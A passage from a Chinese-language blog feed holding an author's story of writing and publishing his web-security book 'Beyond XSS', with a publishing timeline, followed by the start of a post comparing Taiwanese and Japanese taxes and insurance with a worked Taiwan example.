        <content type="html"><![CDATA[<p><img src="/img/the-story-behind-my-xss-book/p0.jpg" alt="書籍封面"></p><p><a href="https://www.tenlong.com.tw/products/9786267383803?list_name=r-zh_tw">Beyond XSS：探索網頁前端資安宇宙</a>是一本即將於 7 月 19 日正式發售的書籍，其內容源自於我在 2023 年 9 月時參加的 iThome 鐵人賽同名系列文章，基本上整本書是改寫自那個系列文，但有修正了一些錯誤，並且加上了全新的章節。</p><p>這篇文章就來寫一下這本書背後的故事，包括我為什麼寫、怎麼寫，以及到底花了多久，又為什麼是 1.5 本書。前面會有一段時間聽我在講古，如果只對出書的部分有興趣，可以快速略過。</p><h2 id="17-年前的夢想"><a href="#17-年前的夢想" class="headerlink" title="17 年前的夢想"></a>17 年前的夢想</h2><p>從小時候開始，就一直覺得能寫一本電腦書的話，那真是太好了。畢竟書並不是每個人都可以寫的，要有出版社的認可，才能寫上一本；而需要得到認可，無論是在技術還是在寫作，都必須具備一定的能力。因此，出書這件事情的目的，對我來說並不在於書要賣得多好，而是「能出書」這件事情的價值。</p><p>大概就像金曲獎一樣，入圍就是肯定，不管得不得獎，只要能入圍就已經很厲害了。</p><p>之前在寫我自己的<a href="https://life.huli.tw/2017/10/05/the-programming-journey-1-b9b19c0ef05b/">故事</a>時就有提過我小時候的經歷，這邊再詳細寫一次。想寫書不是只有說說而已，早在 2007 年的時候，我就寫信到專門出電腦書的松崗出版社，提說我想寫一本 Visual Basic 2005 的入門書。</p><p>而那時出版社回覆由於 Visual Basic 2005 即將改版，因此他們目前並沒有出版入門書籍的計畫，而當時的我也沒有其他能寫的主題，所以就只好放棄。</p><p>2007 年，距今 17 年前，那時我 13 歲，國中二年級。</p><p>當時的提案內容已經不見了，但如果我沒記錯的話，我應該是覺得那些入門書雖然嘴上說著入門，但其實對一般人（或是對我這個國中生）來說門檻還是太高，入不了門。因此我希望由我的角度來寫一本入門書，目標是讓國中生也能看得懂，也能學習寫程式。看來這種「我能講得比其他人清楚」的自信，是從小就有了。</p><p>既然沒辦法寫書，那就只好試試看其他管道了。</p><p>在同年年底，我寫信給雜誌《電腦王》，現在看起來那封信件很沒禮貌，沒頭沒尾的：</p><blockquote><p>請問對這個主題有興趣嗎?<br>用VB2005寫一個檔案監視程式</p></blockquote><p>但以一個沒什麼在用 email 的國中生來說，或許也就這樣了？</p><p>而電腦王的編輯則是很認真回覆了我的信，並且附上提案的範例，跟我說可以給他們一個比較完整的說明，他們才比較好評估是否錄用。而在那之後我給出了這樣一份提案：</p><p><img src="/img/the-story-behind-my-xss-book/p1.png" alt="交給出版社的提案內容"></p><p>接著，編輯回覆說提案沒有問題，於是我就開始寫了，大概花了一週的時間寫完，然後收到編輯修改過的稿子，看到文章裡面有好多虛線以及註解還有修改建議，那時我才知道：「原來 Word 應該是要這樣用」。</p><p>於是呢，在 2008 年 2 月，我寫的稿子被登上了電腦王雜誌，我那時候超級無敵興奮。</p><p><img src="/img/the-story-behind-my-xss-book/p2.png" alt="電腦王雜誌截圖"></p><p>除了我寫的文章被刊出來很開心以外，拿到稿費也很開心。稿費是一字一塊，而且不知道為什麼，我記得連程式碼也算在內（但我沒有偷灌水啦），最後拿到了 3000 多塊錢。</p><p>對一個國中生來說，3000 塊是很大一筆錢。</p><p>然後有個插曲滿好笑的，因為要申請稿費的緣故，需要提供我的身份證影本，結果我回他說：「沒有身分證怎麼辦？」，不過後來因為我剛好滿 14 歲，所以就為了這個去申請了身份證。</p><p>隔了一年，2009 年的 2 月，我又投稿了一篇新的文章，題目為：「Keylogger鍵盤記錄自己寫」，被刊登在 2009 年 6 月出版的雜誌上面。</p><p>後來升上高中之後，就沒有再繼續投稿了。之所以會特別寫這一段，是因為這大概是我開始寫作的開端吧，比部落格還要早。</p><h2 id="為什麼一定要是書？"><a href="#為什麼一定要是書？" class="headerlink" title="為什麼一定要是書？"></a>為什麼一定要是書？</h2><p>讓我們把時間快轉到 2009 年的 5 年後，也就是 2014 年，我大二的時候。因為開始工作的關係，又開始寫起了部落格。只所以會說又，是因為高中的時候也曾經寫過，但只寫了三四個月就停更放棄了。</p><p>從那之後就養成了固定寫部落格文章的習慣，從 2014 一直到現在 2024，這十年間都沒停過。而這段期間也累積了不少讀者，寫過不少文章，也收到許多讚賞的留言，稱讚說某篇文章寫得真好之類的。</p><p>既然寫文章收到這些讚賞已經很開心了，而且部落格也在特定的圈子中小有名氣，那為什麼非得寫書不可呢？</p><p>答案或許跟開頭講的一樣吧，出書有種被認可的感覺，並不是每個人都可以出書的。雖然說寫文章得到稱讚一樣會覺得被認可，但或許是我覺得這樣還不夠吧？或許對大眾（還有我）來說，「我寫了一篇超讚的技術文章」跟「我寫了一本書」，後者還是更厲害一點。</p><p>再者，技術文章通常只是一篇，但要寫書的話，需要更完整的規劃，才能撐起一本書的篇幅。雖然說也有一些書寫得不怎麼樣，但對我來說，我對寫書有一種迷思，認為能出書就是強者。</p><p>一直到 2021 年 7 月的時候，我還在社群媒體上發文，講說小時候的目標之一是寫電腦書，而現在想寫書，最快的管道應該就是 iThome 鐵人賽了，不過我很懶得再參加一次，還是作罷吧。</p><p>但你知道的，後來我還是參加了。</p><h2 id="寫書的捷徑與心態的轉變"><a href="#寫書的捷徑與心態的轉變" class="headerlink" title="寫書的捷徑與心態的轉變"></a>寫書的捷徑與心態的轉變</h2><p>iThome 鐵人賽是一個由 iThome 所舉辦的活動，固定在每年的八九月左右，參賽者必須連續 30 天發文，才算完成比賽，而比賽會根據主題分成不同組別，例如說 Web 組、資安組或是 DevOps 組等等。</p><p>在 2017 年的時候我有寫了一個 <a href="https://ithelp.ithome.com.tw/users/20091346/ironman/1150">Half-Stack Developer 養成計畫</a>系列，拿到了優選。</p><p>而應該是從 2020 年開始，出版社博碩文化開始與 iThome 鐵人賽合作，得獎的書籍都有機會可以出書，至今這個系列已經累積了上百本的書籍。</p><p>這就是為什麼我當時會說想寫書的話，最快的管道就是透過這個比賽，因為只要能得獎，幾乎就是出書的保證。但其實透過鐵人賽得獎來出書，跟我原本想出書的初衷，是有點不太一樣的。</p><p>我為什麼想出書？因為想得到出版社的肯定，我的理想情節是有天出版社主動寄信給我，跟我說他們看我文章寫得不錯，想要邀請我出書，這就是我所謂的「得到出版社的認可」。</p><p>但如果透過鐵人賽就不同了，雖然說我同樣是得到了鐵人賽評審的認可，但之所以能出書，並不是因為「出版社主動看到了我的文章，覺得我的文章有潛力」，而是「我鐵人賽得了獎」，對我來說還是不太一樣的。</p><p>這大概就像是我想要在 YouTube 上面一直發表翻唱 cover，直到某天有唱片公司聯絡我說：「你唱得不錯，有沒有興趣簽約？」，而不是自己去報名歌唱比賽，拿了冠軍之後被合作的唱片公司簽走。</p><p>或許是一種主動跟被動的差別吧？我認為「被動地被發現」比「主動讓別人看見我」，來得更加厲害，更加特別。</p><p>可能很多人會覺得這有些幼稚，覺得這是莫名其妙的堅持，但無論如何，我就是那樣想的。</p><p>在近期探索自我的過程中，我才漸漸明白原來「想要變得特別」是我做很多事情的原因（我以前沒發現這件事）。如果透過鐵人賽得獎出書，我就變得跟許多人一樣，就不特別了。</p><p>然而，在 2023 年的時候，我還是報名了鐵人賽，並且不諱言自己就是為了出書而來。</p><p>之所以會下這個決定，是因為我仔細思考了一番，最後認為無論管道是什麼，途徑是什麼，只要能出書的話，都是值得嘗試的，畢竟出書對我來說還是有其意義在。</p><p>因此，那次報名鐵人賽，在寫的時候就是抱持著我要寫一本書的心態跟架構下去寫的。既然都報名了，那就要認真寫；既然都認真寫了，那就一定要得獎。</p><h2 id="出書-222：2-本書、2-家出版社、2-次延遲交稿"><a href="#出書-222：2-本書、2-家出版社、2-次延遲交稿" class="headerlink" title="出書 222：2 本書、2 家出版社、2 次延遲交稿"></a>出書 222：2 本書、2 家出版社、2 次延遲交稿</h2><p>2023 年 9 月 30 號，我的第 15 屆 iThome 鐵人賽畫下了句點，順利達成了連續 30 天發文的目標，而文章的品質也在我預期之中。預期之中的意思是，有些文章我寫完的時候，會打從心底覺得自己似乎有點厲害，並且給出自己的文章「這切入點真是特別」或是「這個講解方式太強了吧」這些評語。</p><p>而 10 月中的時候，鐵人賽都還沒公布得獎名單，深智數位出版社就透過 email 聯繫了我，說看到我的文章後覺得豐富的經歷讓人印象深刻，問我有沒有出書的意願。</p><p>而後來也跟他們開了簡短的線上會議，大致討論了一下。</p><p>雖然說他們一開始想出的是鐵人賽那個系列，但我認為鐵人賽的合作出版社是另一間博碩文化，在參賽的規章中也有寫說在相同條件下，博碩文化應該優於其他出版社。因此鐵人賽的文章我想先留給博碩文化，至少先談過之後再來決定後續規劃（儘管當時還沒公布得獎名單，但我就覺得一定會有我，至少拿個優選不為過吧）。</p><p>但同時我一直有個很想寫的系列，那就是被我放置很久的：<a href="https://github.com/aszx87410/blog/discussions/93">JavaScript 隨意聊聊</a>，因此與深智討論過後，他們同意用這本書繼續推進，用這本書來簽合約。</p><p>在 11 月初的時候，我們就完成了簽約，當初我自己訂的交稿日期是隔年的 3 月。</p><p>於是呢，從那之後我就過著寫書、拖延、拖稿、寫書、拖延、拖稿的無窮迴圈。</p><p>而 11 月底的時候，鐵人賽公佈了得獎名單，我的系列文是資安組的冠軍，順利拿到了出書的機會。</p><p>接著在 12 月 4 日，收到了博碩文化的通知信，依照裡面的指示與編輯加了 LINE，等待後續的通知。</p><p>而到了隔年（也就是今年，2024 年）的 1 月 31 日，收到博碩的後續通知，要我們整理鐵人賽系列文的全文 Word 檔案、基本資料以及新書規劃，內容是市場上同類型的作品有哪些，自己的作品又有哪些優勢等等。</p><p>而差不多在同一天，我的 JavaScript 書籍進度只有 170 頁（預計要寫 400 頁），進度落後，我自己評估沒辦法在約定好的 3 月完成，因此先通知編輯會延期，至於延到什麼時候，等 2 月底再確定。</p><p>到了 2 月底的時候，進度是 210 頁，大概是一半左右，因此我跟編輯說需要延到五月底。</p><p>然後在 3 月初的時候，博碩那邊有了後續進展，開始到了下一個階段，需要安排線上會議。由於我平日上班時間都沒有辦法，比較難請假，因此只能詢問日本的假日（只有特定幾天）或是平日晚上有沒有空。</p><p>到了 4 月 10 日，收到博碩的通知，給了交稿格式範本讓我們參考，並希望我們提供想要問的問題，之後會安排時間與作者們線上會議。</p><p>而這個時候，我對出書這件事情有了一些別的想法。</p><p>從時程中其實可以看出博碩這邊由於是一次跟所有鐵人賽得獎者聯繫，所以進度會更緩慢一點，但這對我來說反倒是個優點，因為我才有時間能先把 JavaScript 的書完成。</p><p>雖然說原本我是很期待同時跟兩間出版社合作，想說可以比較一下彼此的差異順便寫一篇心得文，但真的合作之後發現自己有點太天真了，蠟燭兩頭燒是真的忙不太過來，就算進度比較緩慢也一樣。</p><p>而且除了寫書，也有其他很多生活上與工作上的事情要忙，開始漸漸覺得要同時顧到兩邊確實是有點累。</p><p>除此之外，4 月中的時候我的 JavaScript 書籍進度在 320 頁，雖然已經完成了 80%，但剩下的那 20% 是很花時間的一個章節（scope、closure 與 this），我並不覺得在一個半月內可以寫完，因此有很高的機率必須往後再延。</p><p>總之呢，我覺得當時再繼續這樣下去的話，我可能會先 burn out，於是再三思考過後，決定把 JavaScript 那本書籍先暫停，並且把鐵人賽的系列文簽給深智，博碩的話就不接著跑後續流程了。</p><p>做這個決定背後的理由是基於：</p><ol><li>為了避免太累，只能選擇一間合作</li><li>JavaScript 書籍需要先暫停寫作。因為一來沒辦法如期交稿，再繼續延我不太好意思，二來我對這個系列有其他想法，例如說其實可以先開個 workshop 再根據學生 feedback 改善，才出成書籍等等。</li><li>只出鐵人賽那本的話，我希望速度盡可能快一點</li></ol><p>因為已經與深智先簽了約，所以把出書的計畫停了也不太對，所以就需要拿鐵人賽那本來補，改成簽那本，而且交稿日維持不變。至於博碩的話還在偏早期的階段，還沒正式開過會也還沒簽約，還來得及中止。</p><p>總之呢，跟兩邊都告知了這個狀況以後，就朝這個方向走了。</p><p>這也是為什麼標題會說是 1.5 本書，因為那 0.5 本是未完成的 JavaScript 書籍，那個章節我依舊還沒動筆。</p><p>因為鐵人賽那本 XSS 的書，原本就是照著寫書的架構去規劃，所以要改的東西並不多，改起來滿快的，因此也在五月底的時候順利交稿。</p><p>5&#x2F;29 交稿之後，隔了一週深智就給了第一章節排版過的範例讓我確認，與此同時跟我要了書的作者介紹以及封面封底的文字，封面的設計我也自己用 AI 產生了幾張圖，讓他們作為範例參考：</p><p><img src="/img/the-story-behind-my-xss-book/p3.png" alt="AI 產生的書籍封面"></p><p>6&#x2F;17 的時候排版完成，進行第一次校對，6&#x2F;20 二校，6&#x2F;26 最後校對，接著 7&#x2F;2 就被通知書籍已經開始預購了。</p><p>進入校對之後，文字上就沒有什麼動了，基本上都是改善一些排版而已。</p><h2 id="書跟原本的系列文差在哪裡？"><a href="#書跟原本的系列文差在哪裡？" class="headerlink" title="書跟原本的系列文差在哪裡？"></a>書跟原本的系列文差在哪裡？</h2><p>前面一再提到當初寫鐵人賽系列文的時候，就已經是用寫書的規劃去寫的，所以原本就規劃 30 篇隸屬於五個章節，從賽後我自己用 Docusaurus 架的網站可以看出來這件事情：<a href="https://aszx87410.github.io/beyond-xss/">https://aszx87410.github.io/beyond-xss/</a></p><p>因此，大約有八成的內容其實都是直接照搬文章。</p><p>剩下的兩成是一些小細節，除了修錯字以及比較不通順的地方以外，我還做了底下這些事情。</p><h3 id="去除連結"><a href="#去除連結" class="headerlink" title="去除連結"></a>去除連結</h3><p>當我在寫文章的時候有兩個習慣：</p><ol><li>附上一堆參考連結</li><li>自己還沒這麼熟的地方，就先放個連結連到補充資訊，讓讀者自己參考</li></ol><p>但這兩點對於實體書籍來講，閱讀體驗其實是不太好的。因為你在看書的時候，不會拿出手機或電腦來訪問這些連結，所以這些連結對於在看實體書籍的人來說，是沒什麼幫助的，甚至閱讀起來會有些干擾。</p><p>因此，有些地方如果參考連結太多，我會把那些內容拿掉或是縮減，盡可能讓它不要太干擾閱讀的體驗。</p><p>再者，有些「有興趣的話可以看 XXX」的地方我拿掉了，直接把參考內容的大意寫在書籍裡面，讀者就不需要自己去看。舉例來講，在第一章我有談到 Chromium 的 RCE 漏洞 CVE-2021-30632，但並沒有解釋原因，而是讓讀者自己去看：</p><p><img src="/img/the-story-behind-my-xss-book/p4.png" alt="原本的鐵人賽版本"></p><p>說穿了其實就是覺得發生原因太複雜需要更多時間研究，但因為沒時間或因為懶所以沒有仔細看，因此至少留個連結給有興趣的人自己看。</p><p>但這樣其實閱讀體驗也不太好，因此在書籍版我就直接補上了相關內容，大概講了一下漏洞發生的原因：</p><p><img src="/img/the-story-behind-my-xss-book/p5.png" alt="修改過的書籍版本"></p><p>這只是其中一處而已，還有其他地方也做了類似的事情。</p><h3 id="補充內容"><a href="#補充內容" class="headerlink" title="補充內容"></a>補充內容</h3><p>XSS 系列文完成的日期是 2023 年 9 月底，其實已經是半年前了，在這半年當中我也有學到一些新知識，就順勢補充進去書裡面。</p><p>例如說原本有一個章節在談 MIME sniffing，是有關 content-type 的知識，我就把今年 4 月份看到的 Flatt Security 的研究 <a href="https://speakerdeck.com/flatt_security/xss-using-dirty-content-type-in-cloud-era">XSS using dirty Content Type in cloud era</a> 也一起補充了進去。</p><p>只要是我有想到可以補充的地方，都會順便補充一下。</p><h3 id="新增章節"><a href="#新增章節" class="headerlink" title="新增章節"></a>新增章節</h3><p>上面的這些改變頂多只是「改進原有的內容」，實際上的主軸還是與原本的文章相同。而我自己認為既然都出書了，那在書籍裡面就應該提供額外的附加價值，一定要有更多本來的文章沒有的東西。</p><p>因此，特地為書籍寫了一個全新的章節：「Case study - 有趣的攻擊案例分享」，寫了 5 個我覺得非常值得一提的例子，這部分大約有 30 頁左右。</p><p>話說寫完之後我才發現怎麼 5 個案例全部都是 XSS，說好的「Beyond XSS」呢。</p><h2 id="寫書以及與出版社合作的心得"><a href="#寫書以及與出版社合作的心得" class="headerlink" title="寫書以及與出版社合作的心得"></a>寫書以及與出版社合作的心得</h2><p>同時與兩間出版社合作的過程中，自然也有感受到兩間出版社的不同。</p><p>博碩文化有許多與鐵人賽作者的合作經驗，因此有一套完整的規劃，就有點像大公司會有那種完整的新人教育訓練一樣，他們會主動提供各種的範例讓你參考，而你自己也必須做出回應，去研究市場上的同類書籍，並且繳交書籍規劃等等。</p><p>不過由於鐵人賽的作者有很多人，所以前置作業的時間會拉的比較長一點。如果對博碩出版的完整流程有興趣，可以參考 Taiming 寫的：<a href="https://just-taiming.medium.com/ithome-%E9%90%B5%E4%BA%BA%E8%B3%BD%E7%B3%BB%E5%88%97%E6%9B%B8%E7%B1%8D-%E5%AE%8C%E6%95%B4%E5%87%BA%E7%89%88%E6%94%BB%E7%95%A5-ea4a3d124341">iThome 鐵人賽系列書籍-完整出版攻略</a>。</p><p>而相對來說，深智數位就比較沒有這麼完整的規劃，主動提供的資源較少一些，但也因為少了許多前置作業，所以可以縮短整體的時程。</p><p>總之呢，我自己與這兩間出版社合作過後，並沒有特別推薦或是不推薦哪一間，兩間合作起來都沒什麼問題，主要還是根據自己的需求以及偏好而定，我自己的話就與深智的風格滿契合的，合作的滿順利的。</p><p>至於有關寫書的心得，儘管大部分內容都有了，但還是覺得滿累的，畢竟對寫書的標準跟寫部落格的標準還是不同的，前者應該要更嚴格一點。另外，實體書本這個載體也是非常特殊，一旦印出了，就沒有辦法更改，因此需要嚴格要求內容的正確性以及盡可能去除錯字以及排版錯誤等等。</p><p>還有我之前提過的，同樣是附一個連結，説「想知道更多可以看這裡」，在網頁上可能 10 個人還會有一兩個點進去，但是在書上，可能 10 個人裡面沒有一個會拿起手機輸入網址。因此，需要盡可能把想補充的都直接補充在書上。</p><p>話說回來，前面有提到寫書曾經是我的夢想之一，參加鐵人賽也是為了寫書，那現在夢想達成了，感覺如何？</p><p>達成了一個里程碑，會開心一下是難免，但總覺得沒有想像中這麼…興奮嗎？比起書籍出版這件事情，在文章寫完的當下，或是看到有人推薦系列文的時候，其實更為開心。</p><p>仔細想想，或許追求目標的過程，比達成目標更為有趣吧。</p><p>以上就是這次寫書的心得以及背後的故事，如果對書有興趣的話，可以至書局購買：<a href="https://www.tenlong.com.tw/products/9786267383803?list_name=r-zh_tw">Beyond XSS：探索網頁前端資安宇宙</a></p><p>最後附上出書跟與出版社聯絡的完整時間軸，供有興趣的人參考：</p><p><code>2023/09/01</code> iThome 鐵人賽開賽<br><code>2023/09/30</code> iThome 鐵人賽完賽<br><code>2023/10/13</code> 深智數位出版社聯繫，詢問出書意願<br><code>2023/10/20</code> 初次線上會議<br><code>2023/10/22</code> 我提了兩個想法，一個是 JavaScript 隨意聊聊，另一個冷知識大全<br><code>2023/10/25</code> 決定出 JavaScript 的書，收到合約<br><code>2023/11/01</code> 簽完合約回傳<br><code>2023/11/09</code> 收到簽好的合約，約定交稿日為 2024&#x2F;03&#x2F;01<br><code>2023/11/28</code> 鐵人賽公布得獎名單<br><code>2023/12/04</code> [博碩] 收到博碩文化的通知信，詢問出版意願並且加 LINE<br><code>2023/12/08</code> [博碩] 收到訊息說要填寫基本資料，之後會主動聯繫</p><p><code>2024/01/23</code> [博碩] 收到訊息說因為編輯有點狀況，會於月底發放詳細資訊<br><code>2024/01/31</code> 進度 170 頁，評估無法完成，延後交稿日<br><code>2024/01/31</code> [博碩] 收到博碩文化後續通知，要整理全文 word、基本資料以及新書規劃<br><code>2024/02/13</code> [博碩] 回傳需要的檔案<br><code>2024/02/29</code> 進度 210 頁，預計需要延期到五月底<br><code>2024/03/08</code> [博碩] 安排博碩會議時間，我說 3&#x2F;20 跟平日晚上可以<br><code>2024/04/10</code> [博碩] 提供交稿格式範本、出版提問清單以及會議時程<br><code>2024/04/15</code> [博碩] 告知博碩不繼續之後的流程<br><code>2024/04/15</code> 與深智重新簽了新的合約，拿 XSS 換<br><code>2024/05/29</code> 初稿完成<br><code>2024/06/04</code> 確認書籍排版<br><code>2024/06/17</code> 排版完成，一次校對<br><code>2024/06/20</code> 二次校對<br><code>2024/06/26</code> 最後校對<br><code>2024/07/02</code> 通知書籍已經開始預購<br><code>2024/07/19</code> 書籍發售</p>]]></content>
      
      
      <categories>
          
          <category> 寫作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 寫作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>到日本工作怎麼繳稅？稅有多重？跟台灣比呢？</title>
      <link href="/2024/05/30/japan-tax-vs-taiwan-tax/"/>
      <url>/2024/05/30/japan-tax-vs-taiwan-tax/</url>
      
        <content type="html"><![CDATA[<p>其實我想寫一篇關於繳稅的文章已經很久了，就算沒有來日本工作，也會寫一篇台灣的繳稅文章。我在 20 歲的時候進入職場工作，但卻有很長一段時間沒有自己報過稅，都直接當媽寶靠我媽幫我報，也沒什麼留意過薪資單上的健保跟勞保還有預扣的稅，完全都不管。</p><p>那時的我甚至認為「所得稅 20%」代表的就是薪水的 20%，例如說收入 5 萬，繳的稅就是 1 萬塊，對扣除額還有累進稅率完全沒有概念。可能對有些人來說會覺得不可思議，想說怎麼連這個都不知道，但對當時的我來說可能也沒必要知道吧，反正到了報稅的時候上網按個按鈕就好，我也懶得去看細項有哪些。</p><p>是一直到最近兩三年，因為興趣的緣故，突然好奇稅金的組成是什麼，我才開始比較認真研究稅金到底包含哪些東西，又是怎麼計算的，話說我的繳稅入門影片應該是這支影片：<a href="https://www.youtube.com/watch?v=8UYn6sj8PAw&ab_channel=%E6%9F%B4%E9%BC%A0%E5%85%84%E5%BC%9FZRBros">報稅起跑！2023綜合所得稅扣除額&amp;級距全圖解 上班族存股ETF配息節稅攻略 | 夯翻鼠FQ76</a>，看了之後對所得稅的概念清楚很多。</p><p>來日本工作之後，覺得對於外國人來說有很多新的概念要學習，例如說厚生年金、源泉徵收、確定申告以及住民稅等等，要不要自己申請？該怎麼申請？什麼時候繳？要繳多少？有什麼方法可以節稅？因此打算寫一篇整理一下，給未來的自己看。</p><p>雖然這篇主要想談的是在日本工作的繳稅，但因為稅金的組成在台灣與日本有很多類似之處，因此我會先從台灣開始談起，會對繳稅這件事情有更深的理解。如果你沒興趣的話，可以直接跳到<a href="#%E6%97%A5%E6%9C%AC%E7%9A%84%E7%A8%85%E8%88%87%E4%BF%9D%E9%9A%AA">日本的段落</a>。</p><p>這篇想解決的問題有：</p><ol><li>台灣稅金與保險構成</li><li>日本稅金與保險構成</li><li>台灣與日本的稅金比較</li><li>日本工作該怎麼報稅、繳稅？</li><li>日本的所得稅該怎麼計算？</li><li>是不是申請永住之後海外收入就會被課稅？</li><li>該怎麼合法節稅？</li><li>故鄉納稅什麼時候要開始準備？</li><li>要離開日本時，有哪些錢可以拿回來？</li></ol><p>由於我研究過後，發現有些東西跟之前聽說的不太一樣，所以我會盡可能附上官方的資料來源，讓想查證的人自行查證。</p><p>2024&#x2F;12&#x2F;15 更新：我用 Cursor 做了一個簡單的台日稅金對照網頁，可以方便輸入各種數字比較兩邊的差異：<a href="https://aszx87410.github.io/japan-taiwan-tax-compare/">https://aszx87410.github.io/japan-taiwan-tax-compare/</a></p><h2 id="台灣的稅與保險"><a href="#台灣的稅與保險" class="headerlink" title="台灣的稅與保險"></a>台灣的稅與保險</h2><p>台灣是在每年的 5&#x2F;1~5&#x2F;31，申報去年一整年的收入。依照法規，如果月薪高於 8.8 萬的話，公司每個月就會先預扣 5% 起來，報稅的時候就會多退少補。</p><p>另外，雖然我們平常都習慣說繳稅繳稅，但其實除了所得稅以外，還有另一個大部分人都一定會繳的，那就是勞保（勞工保險）與健保（健康保險），這兩種嚴格來講似乎不算稅金，但因為通常也是個固定支出，所以我會把這兩個加在一起談。</p><h3 id="台灣的勞保與健保"><a href="#台灣的勞保與健保" class="headerlink" title="台灣的勞保與健保"></a>台灣的勞保與健保</h3><p>我們先從勞保跟健保開始談起好了，健保的話大家應該滿熟悉的了，全名為「全民健康保險」，那健保費又是怎麼算的呢？這邊有衛福部提供的<a href="https://www.nhi.gov.tw/ch/cp-13134-43e43-2569-1.html">投保金額分級表</a>，總共分了 50 級，最低的是月收入 27,470 以下，最高的是 212,001 以上。</p><p>假設小明年薪是 201.5 萬，薪資組成為每個月的收入 155,000 元再加上一個月的年終獎金。那根據投保金額分級表，會被分到第 41 級，月投保金額為 156,400 元。</p><p>而目前健保的費率為 5.17%，其中 30% 員工自己付，60% 公司付，10% 政府付。所以自己每個月要繳的錢就是 156400 * 5.17% * 30% &#x3D; 2425 元，公司的話則是 4851 元。</p><p>接著我們來看勞保，勞保一樣有分級，最高級是月薪 43,901 元以上，投保金額為 45,800 元。而勞保的費率為 12%，其中 20% 自己付，70% 公司付，10% 政府付。</p><p>所以每個月要繳的錢是 1099 元，而公司則是 3847 元。</p><p>因此呢，以每個月薪水 15.5 萬來講，健保要繳 2425 元，勞保則是 1099 元，健保佔了薪水的 1.56%，勞保佔了 0.7%，都是滿小的數字。</p><p>公司的話則是繳了將近 8700 元，差不多是 5.5% 的薪資。</p><p>不過公司還要額外繳一筆費用，叫做勞工退休金，也就是俗稱的勞退，是 6% 的薪水，因此加起來除了你的月薪以外，公司還要額外付出 11.5% 的隱藏成本。</p><p>而員工自己也可以提撥最多 6% 的薪水到勞退的帳戶，叫做勞退自提，好處是這部分不列入所得稅的計算，因此可以作為一個節稅的手段，但缺點就是放到勞退帳戶裡面的錢要 60 歲之後才能領。</p><h3 id="台灣的所得稅計算方式"><a href="#台灣的所得稅計算方式" class="headerlink" title="台灣的所得稅計算方式"></a>台灣的所得稅計算方式</h3><p>接著我們來看看所得稅，所得稅的全名為「個人綜合所得稅」，白話文就是你的收入當中，有一定比例的錢要繳給政府。而這個收入除了每個月的薪水之外，年終獎金也算是收入。</p><p>不過如果你有看過薪資單，會發現裡面通常有個項目叫做「伙食津貼」，2024 年的免稅額是每個月 3000，因此假設我談好的月薪是 50,000 塊，通常實際的項目會是薪水 47,000 加上伙食津貼 3000，需要繳稅的只有 47,000 元。不過這就屬於比較細節的部分了，這邊就先不列入計算。</p><p>同樣是剛剛的例子，年薪 201.5 萬的小明，所得稅該怎麼計算呢？</p><p>在計算稅金之前，有幾項可以扣除：</p><ol><li>薪資所得特別扣除額（每人為 207,000 元）</li><li>免稅額（每人 92,000 元）</li><li>標準扣除額跟列舉扣除額擇一，通常是用標準扣除額 124,000 元</li><li>特別扣除額（幼兒以及長照相關，我沒扣過）</li></ol><p>除此之外其實還有一個「基本生活費差額」，意思就是基本生活會用的錢是不會扣稅的，每個人的基本生活費是 202,000 元，如果前面那堆扣完之後（不含薪資所得特別扣除額）還有剩，就可以再拿來扣除。</p><p>不過以單身人士來說，免稅額加上標準扣除額就超過 20 萬了，因此是沒辦法扣的。話說所得稅的部分，台灣的<a href="https://www.gov.tw/News_Content_26_534742">官方懶人包</a>寫得很清楚，十分推薦閱讀。</p><p>總之呢，扣一扣之後，可以得到一個綜合所得稅淨額：</p><table><thead><tr><th>項目</th><th>金額</th></tr></thead><tbody><tr><td>收入</td><td>2,015,000</td></tr><tr><td>薪資所得特別扣除額</td><td>-207,000</td></tr><tr><td>免稅額</td><td>-92,000</td></tr><tr><td>標準扣除額</td><td>-124,000</td></tr><tr><td>—–</td><td>—–</td></tr><tr><td>所得淨額</td><td>1,592,000</td></tr></tbody></table><p>200 萬的薪水，東扣西扣之後，真正要拿來計算所得稅的總額是 159 萬元，而這些錢該繳多少稅，可以參考底下的表格：</p><table><thead><tr><th>綜合所得稅淨額區間</th><th>稅率</th><th>累進差額</th></tr></thead><tbody><tr><td>0 - 560,000元</td><td>5%</td><td>0元</td></tr><tr><td>560,001元 - 1,260,000元</td><td>12%</td><td>39,200元</td></tr><tr><td>1,260,001元 - 2,520,000元</td><td>20%</td><td>140,000元</td></tr><tr><td>2,520,001元 - 4,720,000元</td><td>30%</td><td>392,000元</td></tr><tr><td>4,720,001元以上</td><td>40%</td><td>864,000元</td></tr></tbody></table><p>由於所得稅是採累進稅率，並不是說我到那個級距就直接乘以稅率，而是 56 萬元以下的部分，稅率就是 5%，而 56 萬 ~ 126 萬的部分，稅率是 12%。</p><p>假設收入是 70 萬，那就是 56 萬 * 5% 再加上 14 萬 * 12%，總共就是 44,800 元。不過要這樣加加減減的話很麻煩，因此表格旁邊有一個「累積差額」可以使用。</p><p>我們直接把 70 萬 * 12%，再扣掉 39,200 元，一樣會得到 44,800 元。簡單來講就是先把所有錢都用 12% 來算，再扣掉 56 萬的 7% 啦，換個方式算而已，但容易很多。</p><p>因此呢，159 萬元要繳的稅就是 1,592,000 * 20% 再扣掉 14 萬，也就是 178,400 元。</p><h3 id="台灣稅收結論"><a href="#台灣稅收結論" class="headerlink" title="台灣稅收結論"></a>台灣稅收結論</h3><p>根據上面的計算，我們可以得出底下的表格：</p><table><thead><tr><th>項目</th><th>金額</th><th>佔比</th></tr></thead><tbody><tr><td>薪水</td><td>2,015,000</td><td>100%</td></tr><tr><td>勞保</td><td>13,188</td><td>0.65%</td></tr><tr><td>健保</td><td>29,100</td><td>1.44%</td></tr><tr><td>所得稅</td><td>178,400</td><td>8.85%</td></tr><tr><td>可支配所得</td><td>1,794,312</td><td>89.04%</td></tr></tbody></table><p>年收入 200 萬，扣完稅金、健保跟勞保以後，最後實拿為 179 萬，大約是原本的九成。</p><p>比對一下我之前寫過的文章，拿了 <a href="https://tw.talent.com/tax-calculator?salary=2015000&from=year&region=Taiwan">talent</a> 的薪資計算器，算出來實拿為 170 萬而已，要嘛是我上面算錯，要嘛就是 talent 算錯，上面我驗算過兩三遍了，因此應該是它算錯了。</p><p>這樣一看，台灣的勞健保跟所得稅確實滿低的，年薪 200 萬在台灣已經是薪資收入的 PR98 左右了，稅跟健保勞保扣完只要 10%。</p><p>話說為了方便計算，都是先用單身來計算，如果是夫妻申報或是要報撫養的話，計算公式就會不太一樣了，因此先不考慮這個，也不考慮勞退自提。</p><h2 